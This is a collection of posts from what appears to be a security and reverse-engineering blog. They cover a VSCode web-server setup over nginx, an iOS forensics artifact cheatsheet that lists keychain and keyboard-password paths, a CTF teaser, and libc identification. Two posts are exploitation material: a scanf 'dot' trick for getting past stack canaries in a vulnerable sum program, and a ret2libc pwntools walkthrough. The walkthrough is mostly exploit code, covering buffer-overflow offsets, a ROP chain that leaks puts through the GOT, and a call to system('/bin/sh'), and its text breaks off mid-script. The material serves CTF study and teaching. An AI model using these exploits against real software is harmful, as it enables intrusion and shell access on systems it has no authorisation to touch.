[{"content":"The fun adventure of running VSCode locally with purely native functionalities.\nIf you want just the working solution, then jump to the Solution section.\nWhy? I like to code from my couch. But I don\u0026rsquo;t have a laptop only iPad.\nHow? (Requirements) it has to support iPad, - ssh remote plugin is not an option, only browser based solution is possible; use only Microsoft Visual Studio Code binary and avoid 3rd party repositories; run it in the local network (so tunnel is not an option since it is proxied over the Internet); it would be nice if connection would be secure. Architecture We are considering 2 machines in the local network:\nlinux server - running vscode server; iPad - client of vscode server. The (painful) story to the success Command We are starting with simple knowledge: code supports running itself as http server with command:\ncode serve-web --host 0.0.0.0 --port 1234 --connection-token super-secret It appears that we can re-configure everything we want, to achieve the goal:\nhost on which server is listening (default: localhost), port to something static (default: random), secret (token) which is required to connect and its passed as GET param (default: random). We have everything what we needed, so post can be ended here, right?\nProblem 1: Unathorized Client When we try to launch the above command and open our code instance from the iPad we can notice the popup with error:\nAn unexpected error occurred that requires a reload of this page. The workbench failed to connect to the server (Error: Connection error: Unauthorized client refused) According to the github issue one of the components will fail for non-localhost server hosting without tls.\nOK, so we can run it over localhost, but behind https proxy like nginx. Nothing simpler, right?\nProblem 2: Find the working nginx config Code runs a lot of things over websockets and here is a big issue, because we need to configure the proxy in the correct way. Here I encountered 3 major subproblems.\nError: WebSocket close with status code 1006 behind nginx proxy It will show-up for the configurations where proxy is with websocket support disabled as described for example here.\nError: Extension file not found when code-server serve-local Something executes, but there are some problems with interactions and server shows errors about missing files as in this case. This is mostly related to websockets and invalid Host header.\nNo error, but still it doesn\u0026rsquo;t work And finally - my favourite - no errors, but when you try to open folder from the browser it just doesn\u0026rsquo;t work - no errors at all.\nSolution It took me a long hours to find the working combination of settings. Below you can find complete, working example.\n1. Generete SSL certs # as root mkdir /etc/ssl/vscode # or whenever you want to put it cd !$ openssl req -new -key code.key -out code.csr -subj \u0026#34;/C=US/ST=State/L=City/O=HOST/CN=YOUR_HOST\u0026#34; openssl x509 -req -days 365 -in code.csr -signkey code.key -out code.crt 2. NGINX Config # in case you don\u0026#39;t have it, instructions for ubuntu sudo apt install nginx sudo systemctl enable nginx sudo systemctl start nginx Create nginx config file in: /etc/nginx/sites-available/code:\nserver { listen 443 ssl; server_name hangar.local; ssl_certificate /path/to/cert.crt; ssl_certificate_key /path/to/cert.key; ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers HIGH:!aNULL:!MD5; location / { proxy_pass http://127.0.0.1:3291/; proxy_http_version 1.1; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;Upgrade\u0026#34;; proxy_connect_timeout 60; proxy_send_timeout 90; proxy_read_timeout 90; proxy_buffer_size 4k; proxy_buffers 4 32k; proxy_busy_buffers_size 64k; proxy_temp_file_write_size 64k; add_header X-Cache $upstream_cache_status; } } In above config please replace the paths to your certs. I will be also using port 3291 for hosting code server over localhost, feel free to replace it if you want.\nNow, enable it:\nsudo ln -s /etc/nginx/sites-available/code /etc/nginx/sites-enabled/code sudo systemctl restart nginx 3. Start code server code serve-web --port 3291 --connection-token YOURSECRET Protip, you can also create the alias from it to run it easier in your .bashrc or .zshrc:\nalias codeserver=\u0026#39;code serve-web --port 3291 --connection-token YOURSECRET\u0026#39; 4. Open it in the browser Go to the https://YOUR_HOSTNAME/?tkn=YOURSECRET and wait for a moment until vsode will launch.\nI recommend to add above url as bookmark to simplify the process of launching Code Server from the browser.\nFinito!\n","permalink":"https://rehex.ninja/posts/run-vscode-in-local-network/","summary":"\u003cp\u003eThe \u003cem\u003efun\u003c/em\u003e adventure of running VSCode locally with purely native functionalities.\u003c/p\u003e","title":"Run Visual Code Web Server in Local Network"},{"content":"Terms Very loose \u0026ldquo;translation\u0026rdquo; of names which can be found in iOS ecosystem\nubiquity = icloud sharingd = AirDrop / continuity Nano = Apple Watch Data Acquisition sysdiagnose Full Filesystem (root required) Backups Encrypted have much more data! Mac: ~/Library/Application Support/MobileSync/Backup/ Windows Vista+: \\Users\\\u0026lt;user\u0026gt;\\AppData\\Roaming\\Apple Computer\\MobileSync\\Backup\\ Artifacts Table(s) with paths to specific artefacts on iOS backup (likely encrypted) / iOS rooted\nArtifact iOS Backup iOS (FFS) Version \u0026amp; Serial Number\n❔ /System/Library/CoreServices/System Version.plist Device UUID ❔ /private/var/Library/Safari/SyncedTabsMetadata.plist Installation date ❌ /[private/var]/mobile/Library/Preferences/com.apple.purplebuddy.plist Cellural Info /wireless/Library/Preferences/com.apple.commcenter.data.plist /private/var/wireless/Library/Preferences/com.apple.commcenter.data.plist iOS - Auto-Wipe Enabled (after failed pin) ❌ [/private/var]/mobile/Library/Preferences/com.apple.springboard.plist Network Interfaces \u0026amp; System Model ❌ /private/var/preferences/SystemConfiguration/NetworkInterfaces.plist Network Information (IP) /preferences/SystemConfiguration/preferences.plist /private/var/preferences/SystemConfiguration/preferences.plist DHCP /db/dhcpclient/leases/ /private/var/db/dhcpclient/leases Known WiFi ❌ [/private/var/]preferences/SystemConfiguration/com.apple.wifi.plist Configuration profiles ❌ /private/var/mobile/Library/ConfigurationProfiles/, /private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles Enterprise Provisioning Profiles ❌ /private/var/MobileDevice/ProvisioningProfiles/ FileSystem Events ❌ \u0026lt;VOLUME ROOT\u0026gt;/.fseventsd Keychains /Keychains: keychain-backup.plist /private/var/Keychains/keychain-2.db LaunchAgent (User) ❌ /Library/LaunchAgents/ LaunchDaemons (System) ❌ /System/Library/LaunchDaemons, System/Library/NanoLaunchDaemons, Library/LaunchDaemons (jailbroken with Cydia) Keyboard - Dictionary - Spelling\naka Passwords! /KeyboardDomain/Library/Keyboard, /mobile/Library/Keyboard /private/var/mobile/Library/Keyboard/ Finder / SpringBoard\nToday View Archive. plist, IconState.plist, \u0026lt;GUID\u0026gt;-CarDisplayIconState.plist /mobile/Library/SpringBoard/ /private/var/mobile/Library/SpringBoard/ Notifications /mobile/Library/UserNotifications/ /private/var/mobile/Library/UserNotifications/ Bluetooth Devices ❌ com.apple.MobileBluetooth.devices.plist , com.apple.MobileBluetooth.ledevices.other.db, com.apple.MobileBluetooth.ledevices.paired.db Installation Log ❌ iOS 6: /mobile/Library/Logs/MobileInstallation/ iOS 7–9: /private/var/mobile/Library/Logs/MobileInstallation/\niOS 10+: /private/var/installd/Library/Logs/MobileInstallation/\n/private/var/mobile/Library/FrontBoard/applicationState.db Unified Logs Logs: /var/db/diagnostics/, Ref Data: /var/db/uuidtext/ Application Preferences /mobile/Applications/\u0026lt;bundle_id\u0026gt;/, /mobile/Library/Preferences, /mobile/Library/ /private/var/mobile/Containers/.../\u0026lt;bundle_id\u0026gt;/Preferences, /private/var/mobile/Preferences, /private/var/mobile/Library/ Application Caches ❌ /private/var/mobile/Containers/.../\u0026lt;bundle_id\u0026gt;/Library/Caches/, /private/var/mobile/Library/Cache/\u0026lt;bundle_id\u0026gt; App Shared Directories ❔ Normal App data: /Data/Application/ Shared App data: /Shared/AppGroup/ Application Snaphosts (thumbs when app is backgrounded) ❌ \u0026lt;app_dir\u0026gt;/Library/Caches/Snapshots/\u0026lt;bundle_id\u0026gt;/ TCC (Transparency, Control Control) - permissions /mobile/Library/TCC/TCC.db /private/var/mobile/Library/TCC/TCC.db Apps using Location Services /root/Library/Caches/locationd/clients.plist /private/var/root/Library/Caches/locationd/clients.plist MRU - Recent Apps ❔(springboard?)\n/mobile/Library/Recents/com.apple.corerecents.recentsd com.apple.springboard.plist\n/private/var/mobile/Library/Recents/com.apple.corerecents.recentsd Internet Accounts ❌ [/private/var]/mobile/Library/Accounts/Accounts{3,4}.sqlite App - Safari\nHistory.db\nLastSession.plist\nBrowserState.db /mobile/Library/Safari/ /private/var/mobile/Library/Safari/, /private/var/mobile/Containers/Data/Application/\u0026lt;GUID\u0026gt;/ App - Safari (FFS only) ❌ /private/var/mobile/Containers/Data/Application/\u0026lt;GUID\u0026gt;/Library/Caches/, /private/var/mobile/Containers/Data/Application/\u0026lt;GUID\u0026gt;/Library/Safari/Thumbnails/, /private/var/mobile/Library/Safari/CloudTabs.db (synced tabs), /private/var/mobile/Containers/Data/Application/\u0026lt;GUID\u0026gt;/Library/Caches/WebKit/ (website visit, cached items list), com.apple.Safari.plist (config \u0026amp; recent searches), RecentlyClosedTabs.plist, Downloads.plist App - Mail\nEnvelope Index (db) /mobile/Library/Mail/ /private/var/mobile/Library/Mail/, /private/var/mobile/Containers/Data/Application/\u0026lt;GUID\u0026gt;/ App - Messages /mobile/Library/SMS/sms.db /private/var/mobile/Library/SMS/sms.db App - Call History (CallHistory.storedata) /mobile/Library/CallHistoryDB/ /private/var/mobile/Library/CallHistoryDB/ App - Voice Mail (voicemail.db, AMR, *.transcript files) /mobile/Library/Voicemail/ /private/var/mobile/Library/Voicemail/ App - Calendar /mobile/Library/Calendar/ /private/var/mobile/Library/Calendar/ App - Reminders (Data-\u0026lt;GUID\u0026gt;.sqlite) /mobile/Library/Reminders /private/var/mobile/Library/Reminders/ App - Address Book aka Contacts\n(AddressBook-v22.abcddb) /mobile/Library/AddressBook [/private/var/]mobile/Library/AddressBook/ App - Notes1 (NoteStore.sqlite, Media/, Preview/) /mobile/Applications/com.apple.notes\n/mobile/Applications/Notes (Legacy) /private/var/mobile/Containers/Shared/AppGroup/\u0026lt;GUID\u0026gt;\n/private/var/mobile/Library/Notes (Legacy) App - Wallet (Cards, Transactions, Peer Payments) ❌ /private/var/mobile/Library/Passes, /private/var/mobile/Library/Mobile Documents/com~apple~shoebox/UbiquitosCards (iCloud)\npasses23.sqlite App - Photos (Photos.sql, photos - xattrs) ❔ [/private/var/]mobile/Media/PhotoData, [private/var/]mobile/Media/ App - Maps /mobile/Applications/com.apple.Maps/ (may not contain all files) /private/var/mobile/Containers/Data/Application/\u0026lt;GUID\u0026gt;/Maps App - ScreenTime ❌ /private/var/mobile/Library/Application Support/com.apple.remotemanagementd AppleWatch ❌ /mobile/Library/DeviceRegistry/ Application Usage\nMedia Playing\nDevice Status (lock, powered)\n(more)2 ❌ /private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db2 Application Usage Volume and Battery Level\nCall Status \u0026amp; Camera State (CurrentPowerlog.PLSQL) - issues with timestamps Sysdiagnose /private/var/containers/Shared/SystemGroup/\u0026lt;GUID\u0026gt;/Library/BatteryLife/ (+Archives/) Health ❌ /private/var/mobile/Library/Health/healthdb_secure.sqlite Device Status - Lock ❌ /private/var/mobile/Library/AggregateDictionary/ADDataStore.sqlitedb Location (significant locations) ❌ /private/var/mobile/Library/Caches/com.apple.routined/ Location (WiFi) ❌ /private/var/root/library/caches/locationd/{cache_encrypted*.db,lockCache_encrypted*.db} Apple Document Versions/Revisions/History ❌ /private/var/.DocumentRevisions-V100/ iCloud Synced Preferences (SyncedPreferences dirs)\n❌ /private/var/mobile/Library/SyncedPreferences/\n/private/var/mobile/Containers iCloud - WiFi ❌ com.apple.wifid.plist (connected), com.apple.airport.plist (available ❔) iCloud - Synced Documents ❌ Mobile Documents/ Uniqied Logs Queries # show all alogs log show --info # Network usage log show --info --predicate \u0026#39;senderImagePath contains[cd] \u0026#34;IPConfiguration\u0026#34; and (eventMessage contains[cd] \u0026#34;SSID\u0026#34; or 6d861c1c51aeae2854076da982bf4829 eventMessage contains[cd] \u0026#34;Lease\u0026#34; or eventMessage contains[cd] \u0026#34;network changed\u0026#34;)\u0026#39; https://developer.apple.com/documentation/os/logging\nSQL Queries https://www.evernote.com/pub/view/sledwards/for518/0cd1d73a-9684-4749-8470-af3a415463d4?locale=en#st=p\u0026n=0cd1d73a-9684-4749-8470-af3a415463d4 https://github.com/mac4n6/APOLLO Tooling tips Timestamps Timestamps starting from 1 are likely to be UNIX Epoch timestamps, others (example 5) - Mac Epoch\nEpoch Converter eopchalypyse.py Plists plutil, plistutil, xcode Plain text: 3C3F 786D 6C - \u0026lt;?xml Binary: 6270 6c69 7374 3030 - bplist00 xattrs # list all xattr -lx \u0026lt;file\u0026gt; # dump hex plist embedded in xattr xattr -px com.apple.metadata:kMDItemDownloadedDate LiberiOS11.0.3.ipa | xxd -r -px | plutil -p - sysdiagnose dump analyser GitHub - cheeky4n6monkey/iOS_sysdiagnose_forensic_scripts\nMac_apt / iOS_apt (filesystem analyser) GitHub - ydkhatri/mac_apt: macOS (\u0026amp; ios) Artifact Parsing Tool\nkeychains Import to system keychain (visible under custom keychains) or security command iOS requires decryption3: python keychain_tool.py -d keychain-backup.plist Manifest.plist apple system log log or syslog\nfsmon monitor filesystem events\nReferences https://www.ciofecaforensics.com/2020/01/10/apple-notes-revisited/ Apple Notes\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://github.com/mac4n6/APOLLO Apollo Project\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://dpron.com/recovering-google-authenticator-keys-from-ios-backups/ Steps 1-3\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://rehex.ninja/posts/ios-forensics-cheatsheet/","summary":"","title":"iOS Forensics Cheatsheet"},{"content":" Welcome to Cosy Casino. Try your luck to win a bunch of 💎 and become a millionaire! Be careful not to be addicted though.. Rules: No smoking, no guns and no pets are allowed inside the Casino, especially canaries..\nGeneral Hints pwntools lib is your friend copy-pasted code tends to be vulnerable if pasted incorrectly ;) check where stack variables of threat functions are located remember that you can always patch the local binary to make your life easier sometimes the only way to bypass the canary is to forge own canary Writeup This task is still live, so the writeup is available only in encrypted 7zip.\nUse flag from challenge to read the writeup, public version of writeup will be released after this task will be retired.\n","permalink":"https://rehex.ninja/posts/writeup-cosy-casino/","summary":"","title":"Writeup - Cosy Casino"},{"content":"How to find the libc version without having its local copy.\nScenario Todays scenario is similar to the one described in my previous artice:\nwe have the binary vulnerable to ret2libc we managed to leak the address of puts in memory but we don\u0026rsquo;t have the libc given, so we can\u0026rsquo;t calculate the offsets in memory Solution Leak the address of any function in memory Go to libc database 1 or 2 Fill the form with function name and last 3 characters of address and press search Download provided libc binary or use the offsets provided by database ","permalink":"https://rehex.ninja/posts/identifying-libc/","summary":"\u003cp\u003eHow to find the libc version without having its local copy.\u003c/p\u003e","title":"pwn\u003e Finding the libc version"},{"content":"How to bypass the stack canary with . (dot) and scanf.\nScenario Imagine that you have given binary implemented by following code (compiled with default settings):\n#include \u0026lt;cstdio\u0026gt; void sum() { double buffer[20]; int n = 0; double s = 0; printf(\u0026#34;How many numbers do you want to add?\\n\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for(int i=0; i\u0026lt;n; i++) { printf(\u0026#34;Number[%d]: \u0026#34;, i); scanf(\u0026#34;%lf\u0026#34;, \u0026amp;buffer[i]); s += buffer[i]; } printf(\u0026#34;Your sum: %lf\\n\u0026#34;, s); } int main() { sum(); return 0; } Above code obviously trusts user input and allows to overwrite arbritrary data which can be weaponized with ret2libc and lead to gaining the shell. But there is one big problem - stack canary:\noverwriting stack canary will cause exception we can\u0026rsquo;t brute-force the stack cookie (program is not giving us such possibility) unsigned __int64 sum(void) { int v1; // [rsp+10h] [rbp-C0h] BYREF unsigned int i; // [rsp+14h] [rbp-BCh] double v3; // [rsp+18h] [rbp-B8h] double v4[21]; // [rsp+20h] [rbp-B0h] BYREF unsigned __int64 v5; // [rsp+C8h] [rbp-8h] v5 = __readfsqword(0x28u); v1 = 0; v3 = 0.0; puts(\u0026#34;How many numbers do you want to add?\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;v1); for ( i = 0; (int)i \u0026lt; v1; ++i ) { printf(\u0026#34;Number[%d]: \u0026#34;, i); scanf(\u0026#34;%lf\u0026#34;, \u0026amp;v4[i]); v3 = v4[i] + v3; } printf(\u0026#34;Your sum: %lf\\n\u0026#34;, v3); return __readfsqword(0x28u) ^ v5; } Game Over? Not exactly ;) Notice that user input is collected with scanf(\u0026quot;%lf\u0026quot;, \u0026amp;buffer[i]) and here is the trick: you can pass . (dot) as input, which will skip overwriting the data in referenced variable:\nNumber[20]: . Number[21]: . Your sum: -92773155265697924505313227519998636757689855298695787655081074157174089977436344947792687303154543628009248831613884078618796617025716224.000000 [Inferior 1 (process 29710) exited normally] scanf under the hood What First question which comes to mind after seeing this trick is Why it happens - I will try to answer to this question in the next section - and Is it working only for doubles?.\nI created a very simple test program which will help us understand the scope of this trick without reading the source:\n#include \u0026lt;cstdio\u0026gt; int main() { double foo = 3.7; scanf(\u0026#34;%lf\u0026#34;, \u0026amp;foo); printf(\u0026#34;%lf\\n\u0026#34;, foo); } According to my test results:\ninteger numbers (tested on %d) . and .5 don\u0026rsquo;t overwrite the data floating point numbers (tested on $d, %lf) only . don\u0026rsquo;t overwrite the data hexadecimal numbers only . don\u0026rsquo;t overwrite the data strings (%s) data is always overwritten (as expected) Summarizing our findings - it seems that . affects all numeric string formats1.\nWhy This part is partially based on the intuition, so it don\u0026rsquo;t have to be 100% accurate\nSource Code can be found [here]2.\nKeeping the long story short:\nin _IO_vfscanf_internal all characters are checked and parsed one by one legit characters are stored in struct char_buffer charbuf; numeric values divided by . are decomposed into separate values and then converted appropriately into the value of choosen type (ints: only characters before . are parsed; floats: everything before . is interpreted as 0 only if data is available behind the dot). References https://en.wikipedia.org/wiki/Scanf_format_string\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://git.launchpad.net/glibc/tree/stdio-common/vfscanf-internal.c\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://rehex.ninja/posts/scanf-and-hateful-dot/","summary":"\u003cp\u003eHow to bypass the stack canary with \u003ccode\u003e.\u003c/code\u003e (dot) and \u003ccode\u003escanf\u003c/code\u003e.\u003c/p\u003e","title":"pwn\u003e scanf and hateful dot"},{"content":"How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc \u0026amp; pwntools by example.\nNOTICE I\u0026rsquo;m not very experienced in the \u0026ldquo;offensive RE\u0026rdquo; ~\u0026gt; pwns. If you will find some mistakes in my explainations, then please let me know in the comments :)\nPrerequisites exploitable (linux) binary python3 + pwntools (I\u0026rsquo;m using it in virtualenv) GDB + gef # quick install sudo apt install gdb python3 python3-pip # install gef (https://github.com/hugsy/gef) wget -O ~/.gdbinit-gef.py -q http://gef.blah.cat/py echo source ~/.gdbinit-gef.py \u0026gt;\u0026gt; ~/.gdbinit # install pwntools in virtualenv (https://docs.pwntools.com/en/stable/) pip install virtualenv virtualenv -p python3 venv . ./venv/bin/activte pip install pwntools My exploitable binary have following properties:\ngef➤ checksec [+] checksec for \u0026#39;binary\u0026#39; Canary : ✘ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : Full Hunt for the exploitable code This tutorial will focus only on binaries with enabled relocation, it will fully ignore the PIE or stack canaries.\nThe easiest way to find the exploitable code is actually to play with the binary, learn about it\u0026rsquo;s background. It is worth noticing that exploitable functionality will be triggered from somewhere where binary interacts with the user (receive \u0026amp; parse packets, user input, configs)\nIn my case the binary have only 4 \u0026ldquo;input fields\u0026rdquo; and only one of them allows to overwrite the allocated buffer:\n// ida pseudo-code: int fill() { char buf[32]; // [rsp+0h] [rbp-20h] BYREF memset(buf, 0, sizeof(buf)); printf(\u0026#34;How much data do you want to store?\\n\u0026gt; \u0026#34;) read(0, buf, 0x400uLL); // buffer can be overwritten return printf(\u0026#34;\\nEnjoy your %s\u0026#34;, buf); } buf can handle only 32 bytes, but read can read 400, so we should be to fully fill the buffer and overwrite the return address. Stack looks like that:\n+----------------+ | return addr | \u0026lt;- saved address of return when call fill was exeuted +----------------+ | stored_rbp | \u0026lt;- saved RBP +----------------+ | | | buffer | \u0026lt;- local variables | | +----------------+ Protip\nASM call \u0026lt;func\u0026gt; is contained from the 2 instructions: push $rip+1, jmp \u0026lt;func\u0026gt;, so it saves the address of the next instruction and performs jump to the called function.\nret is analogical, it consists of pop \u0026amp; jmp\nProve that you are in control Next natural step is to verify that we actually can control the rip registry, the easiest way to achieve that is to run it in gdb with gef installed and generate the pattern:\ngef➤ pattern create 60 [+] Generating a pattern of 60 bytes aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa [+] Saved as \u0026#39;$_gef0\u0026#39; Protip\nGenerated pattern is using readable characters which are containing unique set of characters which can be easily located in the string for identifying the offset of specified substring.\nThen just use generated payload as input data in potentially vulnerable functionality. In my case I had to navigate to the proper menu and paste the payload as choice option. As result the program crashed and gdb handled the exception:\n\u0026gt; aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa Enjoy your aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa Program received signal SIGSEGV, Segmentation fault. [ Legend: Modified register | Code | Heap | Stack | String ] ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0x49 $rbx : 0x0 $rcx : 0x0 $rdx : 0x00007ffff7dd18c0 → 0x0000000000000000 $rsp : 0x00007fffffffe278 → \u0026#34;faaaaaaagaaaaaaahaaa\\n\u0026#34; $rbp : 0x6161616161616165 (\u0026#34;eaaaaaaa\u0026#34;?) $rsi : 0x00007fffffffbbb0 → \u0026#34;Enjoy your aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaa\u0026#34; $rdi : 0x1 $rip : 0x0000000000400eec → \u0026lt;fill+162\u0026gt; ret $r8 : 0x49 $r9 : 0x3d $r10 : 0xffffffc3 $r11 : 0x246 $r12 : 0x00000000004006e0 → \u0026lt;_start+0\u0026gt; xor ebp, ebp $r13 : 0x00007fffffffe370 → 0x0000000000000001 $r14 : 0x0 $r15 : 0x0 $eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification] $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffe278│+0x0000: \u0026#34;faaaaaaagaaaaaaahaaa\\n\u0026#34; ← $rsp 0x00007fffffffe280│+0x0008: \u0026#34;gaaaaaaahaaa\\n\u0026#34; 0x00007fffffffe288│+0x0010: 0x0000000a61616168 (\u0026#34;haaa\\n\u0026#34;?) 0x00007fffffffe290│+0x0018: 0x0000000000401040 → \u0026lt;__libc_csu_init+0\u0026gt; push r15 0x00007fffffffe298│+0x0020: 0x00007ffff7a05b97 → \u0026lt;__libc_start_main+231\u0026gt; mov edi, eax 0x00007fffffffe2a0│+0x0028: 0x0000000000000001 0x00007fffffffe2a8│+0x0030: 0x00007fffffffe378 → 0x00007fffffffe5eb → \u0026#34;/tmp/binary\u0026#34; 0x00007fffffffe2b0│+0x0038: 0x0000000100008000 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── 0x400ee5 \u0026lt;fill+155\u0026gt; call 0x400670 \u0026lt;printf@plt\u0026gt; 0x400eea \u0026lt;fill+160\u0026gt; nop 0x400eeb \u0026lt;fill+161\u0026gt; leave → 0x400eec \u0026lt;fill+162\u0026gt; ret [!] Cannot disassemble from $PC ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \u0026#34;binary\u0026#34;, stopped 0x400eec in fill (), reason: SIGSEGV ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x400eec → fill() ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x0000000000400eec in fill () Bingo! Program crashed because it tried to jump \u0026amp; execute instructions under the invalid address. Now you can find the address which overwritten return pointer:\ngef➤ pattern offset $rsp [+] Searching \u0026#39;$rsp\u0026#39; [+] Found at offset 40 (little-endian search) likely [+] Found at offset 33 (big-endian search) Protip\nWe can find the address in rsp, because processor failed to execute ret instruction. rip still points to problematic instruction.\nProtip\nAs argument for pattern offset you can also provide the string or hex number:\ngef➤ pattern offset faaaaaaagaaaaaaahaa [+] Searching \u0026#39;faaaaaaagaaaaaaahaa\u0026#39; [+] Found at offset 40 (big-endian search) gef➤ pattern offset 0x6161616161616166 [+] Searching \u0026#39;0x6161616161616166\u0026#39; [+] Found at offset 40 (little-endian search) likely [+] Found at offset 33 (big-endian search) Save the found offset (40 in my case), we will need it later.\nDevelop the exploit (ret2libc) The ret2libc consists of several simple steps:\nLeak the libc function\u0026rsquo;s address Calculate the address of libc in memory Redirect the execution flow to the leaked libc function such as system to execute the /bin/sh Notice!\nAll steps needs to be performed during single program execution (due to the randomization). For this you need to have 2 vulnerable functions or just call the vulnerable code twice ;)\nPWNtools: quick start We are going to start from loading binaries (binary and libc) into the pwntools:\nimport pwn p = pwn.process(\u0026#39;./binary\u0026#39;) #p = pwn.remote(\u0026#34;138.68.182.108\u0026#34;, 30784) pwn.context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;) #pwn.context.log_level = \u0026#39;debug\u0026#39; elf = pwn.ELF(\u0026#34;./binary\u0026#34;) libc = pwn.ELF(\u0026#34;./libc.so.6\u0026#34;) Protip\nIf you want to perform this code remotely then uncomment pwn.remote (\u0026amp; comment pwn.process), for debug logs uncomment pwn.context.log_level = 'debug'.\nNow we can pretty easily use the binaries meta information such us stored symbols, etc.\nIt might happen that vulnerable code is stored behind some menus, for navigation through program you can use several functions:\np.recvuntil(\u0026#34;\u0026gt; \u0026#34;) # receive stdout until this substring p.recv(0xff) # receive n number of bytes p.recvline() # receive stdout until new line p.send(b\u0026#39;foo\u0026#39;) # send bytes p.sendline(b\u0026#39;foo\u0026#39;) # send \u0026#39;foo\\n\u0026#39; (with new line character) # optionally use the timeout parameter to wait for output p.recv(0xff, timeout=0.5) Leak address So, now you managed to load the binary, execute it and navigate to vulnerable functionallity.\nNow it\u0026rsquo;s time to create the payload - the easiest way to achieve it is to use ROP module\nIn the code below I am constructing the ROP chain which will:\nFill the buffer (32 bytes) Overwrite the saved base pointer on stack (8 bytes) Call puts to leak GOT puts address Redirect the execution flow to the same, vulnerable function (fill in my case) Joins the fill bytes with ROP chain Sends the payload fill = b\u0026#39;A\u0026#39; * 40 rop = pwn.ROP(elf) rop.call(elf.plt[\u0026#34;puts\u0026#34;], [elf.got[\u0026#34;puts\u0026#34;]]) rop.call(elf.symbols[\u0026#34;fill\u0026#34;]) payload = b\u0026#34;\u0026#34;.join([fill, rop.chain()]) p.sendline(payload) Under the hood of rop.call\nIn different architectures functions are called using specific call conventions1. For example in linux x8664: 1st argument of function is always passed via rdi registry. If we want to to call the function with argument we need to make sure that argument value is stored in the mentioned registry.\nFor that we create the ROP chain which will:\nJump to the code containing instructions taking the argument from stack and placing it in rdi (pop rdi). Take address to jump from stack and jump to it (ret). In general rop.call chain will look like that:\u0026lt;pop rdi; ret addr\u0026gt; \u0026lt;arg\u0026gt; \u0026lt;func_addr\u0026gt; (pwntools is capable of finding gadgets needed to call the function will all arguments).\nPLT vs GOT2\nPLT - Procedure Linkage Table, contain stubs to jump to the target GOT - tables of the target addresses (resolved runtime) You can find these values by yourself:\n$ objdump -D ./binary| grep puts 0000000000400650 \u0026lt;puts@plt\u0026gt;: 400650: ff 25 52 19 20 00 jmpq *0x201952(%rip) # 601fa8 \u0026lt;puts@GLIBC_2.2.5\u0026gt; ... We can interpret above output as:\nPLT address = 0x400650 GOT entry = 0x601fa8 After sending such prepared payload to the program the stack should look like that:\n+----------------+ | ptr_plt_puts | \u0026lt;- pointer to puts function which will be executed +----------------+ | ptr_got_puts | \u0026lt;- address to entry of puts in GOT, value will be printed by puts above +----------------+ | ptr_poprdi | \u0026lt;- pointer to pop rdi; ret +----------------+ | | | fill | \u0026lt;- our \u0026#34;fill\u0026#34;, which just overflows the buffer and saved rbp | (A*40) | | | +----------------+ Now we need to parse the output, this part is individual for each program. I really recommend enabling debugging output which will show transfered data.\nProtip - Enable Debug Mode\npwn.context.log_level = \u0026#39;debug\u0026#39; # parse leaked address raw_data = p.recvuntil(\u0026#39;\\n\u0026#39;) raw_data = raw_data.strip() # \\ raw_data = raw_data[-6:] # - skip unnecesary data leaked_puts = raw_data.ljust(8, b\u0026#39;\\x00\u0026#39;) # fill missing bytes with zeroes leaked_puts = pwn.u64(leaked_puts) Packing and Unpacking the bytes\npwntools contains built-in functions for packing and unpacking bytes - conversion of bytes between the strings and ints according to set environment with context function (endianness is set automatically).\n\u0026gt;\u0026gt;\u0026gt; pwn.p64(0x4142424245464748) b\u0026#39;HGFEBBBA\u0026#39; \u0026gt;\u0026gt;\u0026gt; pwn.u64(b\u0026#39;HEXIFYIT\u0026#39;) 6073483730898928968 # 0x5449594649584548 Run /bin/sh The \u0026ldquo;last\u0026rdquo; step consists of the following substeps:\nCalculate the address of libc in memory Calculate the address of system() function and its argument (\u0026quot;/bin/sh\u0026quot;) Prepare the ropchain \u0026amp; pass it as argument Ok, but why?\nYou might wondering here why not just call the system() directly in the previous step. It seems to be might simpler, than whole play with calling the same function once again.\nThe reason is simple: there is no system plt entry in our binary, so we can\u0026rsquo;t call it:\n$ objdump -D ./binary| grep \u0026#39;system\u0026#39; # empty output We don\u0026rsquo;t have it in our binary, so we need to find it in the memory by tracing common functions - in our case puts.\npwn.info(\u0026#34;Stage 2, ret2shell\u0026#34;) # calculate offset, base address of the libc in the memory libc.address = leaked_puts - libc.symbols[\u0026#39;puts\u0026#39;] # prepare the final payload rop = pwn.ROP(libc) rop.call(rop.find_gadget([\u0026#39;ret\u0026#39;])) # just for fixing padding, you might not need it rop.call(libc.symbols[\u0026#39;system\u0026#39;], [next(libc.search(b\u0026#34;/bin/sh\\x00\u0026#34;))]) # with null-byte to make sure that we don\u0026#39;t try to execute some /bin/sh appended with garbage 